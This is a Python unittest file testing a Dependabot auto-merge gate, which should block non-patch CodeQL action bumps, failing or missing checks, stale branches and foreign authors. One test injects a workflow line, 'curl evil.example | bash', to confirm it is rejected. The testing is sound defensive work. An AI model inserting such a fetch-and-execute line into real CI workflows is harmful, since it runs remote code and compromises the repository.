"""Offline negative-path tests for the trusted Dependabot merge gate."""
import unittest
from unittest.mock import patch

import dependabot_automerge as m


class DummyAPI:
    repo = 'Railsimulatornet/autoheal'

    def __init__(self):
        self.files = {
            '.github/workflows/codeql.yml': (
                'uses: github/codeql-action/init@9b3254085494b55a0f7c4c2b3d2d52cc712ce370\n'
                'uses: github/codeql-action/analyze@9b3254085494b55a0f7c4c2b3d2d52cc712ce370\n'),
            '.github/workflows/security-scan.yml': (
                'uses: github/codeql-action/upload-sarif@v4.39.1\n'),
            '.github/workflows/docker-publish.yml': 'name: Docker Image\n',
        }
        self.data = {}
        self.lists = {}
        self.calls = []

    def file(self, path, ref):
        return self.files[path]

    def get(self, path):
        self.calls.append(('GET', path))
        if path.startswith('/repos/github/codeql-action/git/ref/tags/'):
            return {'object': {'type': 'tag', 'sha': 'tagsha-' + path.rsplit('/', 1)[-1]}}
        if path.startswith('/repos/github/codeql-action/git/tags/'):
            return {'object': {'type': 'commit', 'sha': ('8' * 40 if path.endswith('v4.39.2') else '9b3254085494b55a0f7c4c2b3d2d52cc712ce370')}}
        return self.data[path]

    def pages(self, path, key=None):
        self.calls.append(('PAGES', path))
        return self.lists[path]

    def request(self, path, method='GET', payload=None):
        self.calls.append((method, path, payload))
        return {'merged': True, 'sha': 'newcommit'}


def action_diff(before='v4.39.0', after='v4.39.1', kind='upload-sarif', path='.github/workflows/security-scan.yml'):
    return [{'filename': path, 'status': 'modified',
             'patch': '@@ -1 +1 @@\n'
                      f'-        uses: github/codeql-action/{kind}@{before}\n'
                      f'+        uses: github/codeql-action/{kind}@{after}'}]


def sample_api(require_pipeline=False):
    a = DummyAPI()
    head = 'h' * 40
    name = 'Railsimulatornet/autoheal'
    a.lists[f'/repos/{name}/actions/runs?event=pull_request&head_sha={head}'] = [
        {'status': 'completed', 'conclusion': 'success', 'name': 'CodeQL'}]
    expected = ('CodeQL', 'Analyze (actions)', 'Analyze (python)')
    a.lists[f'/repos/{name}/commits/{head}/check-runs'] = [
        {'status': 'completed', 'conclusion': 'success', 'name': n} for n in expected]
    a.lists[f'/repos/{name}/pulls/7/files'] = action_diff()
    a.data[f'/repos/{name}/commits/{head}/status'] = {'statuses': []}
    a.data[f'/repos/{name}/git/ref/heads/main'] = {'object': {'sha': 'b' * 40}}
    a.data[f'/repos/{name}/compare/{"b" * 40}...{head}'] = {'behind_by': 0, 'ahead_by': 1}
    a.data[f'/repos/{name}/pulls/7'] = {
        'state': 'open', 'draft': False,
        'user': {'login': 'dependabot[bot]'},
        'base': {'ref': 'main', 'sha': 'b' * 40},
        'head': {'sha': head, 'ref': 'dependabot/github_actions/actions-patch-123',
                 'repo': {'full_name': name}},
        'labels': [{'name': 'automerge:patch:github-actions'}],
        'mergeable': True, 'mergeable_state': 'clean',
    }
    if require_pipeline:
        a.lists[f'/repos/{name}/actions/runs?event=pull_request&head_sha={head}'].append(
            {'status': 'completed', 'conclusion': 'success', 'name': 'Docker Image'})
        a.lists[f'/repos/{name}/commits/{head}/check-runs'].extend(
            {'status': 'completed', 'conclusion': 'success', 'name': n}
            for n in ('metadata', 'security / security', 'validate'))
    return a, head


class PatchValidation(unittest.TestCase):
    def test_tags_patch_ok(self):
        self.assertTrue(m.check_codeql_patch(action_diff()))

    def test_sha_pin_patch_ok(self):
        old = '6' * 40
        new = '9' * 40
        self.assertFalse(m.check_codeql_patch(action_diff(old, new, 'init', '.github/workflows/codeql.yml')))

    def test_minor_update_blocked(self):
        with self.assertRaises(m.Blocked):
            m.check_codeql_patch(action_diff('v4.38.3', 'v4.39.1'))

    def test_major_update_blocked(self):
        with self.assertRaises(m.Blocked):
            m.check_codeql_patch(action_diff('v4.39.1', 'v5.0.0'))

    def test_injected_shell_blocked(self):
        files = action_diff()
        files[0]['patch'] += '\n+        run: curl evil.example | bash'
        with self.assertRaises(m.Blocked):
            m.check_codeql_patch(files)

    def test_missing_diff_blocked(self):
        files = action_diff()
        files[0]['patch'] = None
        with self.assertRaises(m.Blocked):
            m.check_codeql_patch(files)

    def test_other_action_blocked(self):
        files = action_diff()
        files[0]['patch'] = files[0]['patch'].replace('github/codeql-action/', 'actions/checkout@')
        with self.assertRaises(m.Blocked):
            m.check_codeql_patch(files)

    def test_filename_restriction(self):
        with self.assertRaises(m.Blocked):
            m.check_codeql_patch(action_diff(path='Dockerfile'))

    def test_generic_patches(self):
        cfg = m.CONFIG['autoheal']
        self.assertTrue(m.eligible_files('docker', [{'filename': 'Dockerfile', 'status': 'modified'}], cfg))
        with self.assertRaises(m.Blocked):
            m.eligible_files('docker', [{'filename': '.github/workflows/hack.yml', 'status': 'modified'}], cfg)

    def test_patch_label_required(self):
        with self.assertRaises(m.Blocked):
            m.patch_family({'labels': [{'name': 'dependencies'}]})
        with self.assertRaises(m.Blocked):
            m.patch_family({'labels': [{'name': 'automerge:patch:docker'},
                                            {'name': 'automerge:patch:pip'}]})


class Alignment(unittest.TestCase):
    def test_aligned_refs(self):
        m.enforce_codeql_alignment(DummyAPI(), 'head')

    def test_upload_out_of_sync(self):
        a = DummyAPI()
        a.files['.github/workflows/security-scan.yml'] = 'uses: github/codeql-action/upload-sarif@v4.39.2'
        with self.assertRaises(m.Blocked):
            m.enforce_codeql_alignment(a, 'head')

    def test_init_analyze_mismatch(self):
        a = DummyAPI()
        a.files['.github/workflows/codeql.yml'] = a.files['.github/workflows/codeql.yml'].replace(
            'analyze@9b3254085494b55a0f7c4c2b3d2d52cc712ce370', 'analyze@' + '8' * 40)
        with self.assertRaises(m.Blocked):
            m.enforce_codeql_alignment(a, 'head')


class CheckRuns(unittest.TestCase):
    def test_ci_passes(self):
        a, sha = sample_api()
        m.verify_checks(a, sha, m.CONFIG['autoheal'], False)

    def test_trivy_neutral_blocks(self):
        a, sha = sample_api()
        a.lists[f'/repos/{a.repo}/commits/{sha}/check-runs'].append(
            {'name': 'Trivy', 'status': 'completed', 'conclusion': 'neutral'})
        with self.assertRaises(m.Blocked):
            m.verify_checks(a, sha, m.CONFIG['autoheal'], False)

    def test_missing_codeql_blocks(self):
        a, sha = sample_api()
        a.lists[f'/repos/{a.repo}/commits/{sha}/check-runs'].pop()
        with self.assertRaises(m.Blocked):
            m.verify_checks(a, sha, m.CONFIG['autoheal'], False)

    def test_missing_pipeline_blocks(self):
        a, sha = sample_api()
        with self.assertRaises(m.Blocked):
            m.verify_checks(a, sha, m.CONFIG['autoheal'], True)

    def test_failing_run_blocks(self):
        a, sha = sample_api()
        a.lists[f'/repos/{a.repo}/actions/runs?event=pull_request&head_sha={sha}'][0]['conclusion'] = 'failure'
        with self.assertRaises(m.Blocked):
            m.verify_checks(a, sha, m.CONFIG['autoheal'], False)

    def test_skipped_publication_is_expected(self):
        a, sha = sample_api()
        a.lists[f'/repos/{a.repo}/commits/{sha}/check-runs'].append(
            {'name': 'publish', 'status': 'completed', 'conclusion': 'skipped'})
        m.verify_checks(a, sha, m.CONFIG['autoheal'], False)


class Merging(unittest.TestCase):
    def test_up_to_date_validates(self):
        a, sha = sample_api(require_pipeline=True)
        self.assertEqual(m.verify_candidate(a, 7, m.CONFIG['autoheal']), (sha, 'github-actions'))

    def test_stale_branch_blocked(self):
        a, sha = sample_api(require_pipeline=True)
        a.data[f'/repos/{a.repo}/compare/{"b"*40}...{sha}']['behind_by'] = 1
        with self.assertRaises(m.Blocked):
            m.verify_candidate(a, 7, m.CONFIG['autoheal'])

    def test_stale_event_sha_blocked(self):
        a, sha = sample_api(require_pipeline=True)
        with self.assertRaises(m.Blocked):
            m.verify_candidate(a, 7, m.CONFIG['autoheal'], 'old-sha')

    def test_foreign_author_blocked(self):
        a, sha = sample_api(require_pipeline=True)
        a.data[f'/repos/{a.repo}/pulls/7']['user']['login'] = 'attacker'
        with self.assertRaises(m.Blocked):
            m.verify_candidate(a, 7, m.CONFIG['autoheal'])

    def test_dry_run_never_merges(self):
        a, sha = sample_api(require_pipeline=True)
        m.merge_candidate(a, 7, m.CONFIG['autoheal'], True)
        self.assertFalse(any(c[0] == 'PUT' for c in a.calls))

    def test_merge_and_dispatch_codeql(self):
        a, sha = sample_api(require_pipeline=True)
        m.merge_candidate(a, 7, m.CONFIG['autoheal'], False)
        self.assertIn(('POST', f'/repos/{a.repo}/actions/workflows/codeql.yml/dispatches', {'ref': 'main'}), a.calls)
        self.assertTrue(any(c[0] == 'PUT' for c in a.calls))

    def test_untrusted_workflow_event_ignored(self):
        a, _ = sample_api()
        nums, sha = m.choose_prs(a, {'event_type': 'workflow_run', 'workflow_run': {
            'event': 'pull_request', 'actor': {'login': 'attacker'},
            'head_sha': 'bad', 'pull_requests': [{'number': 7}]}})
        self.assertEqual(nums, [])


if __name__ == '__main__':
    unittest.main()
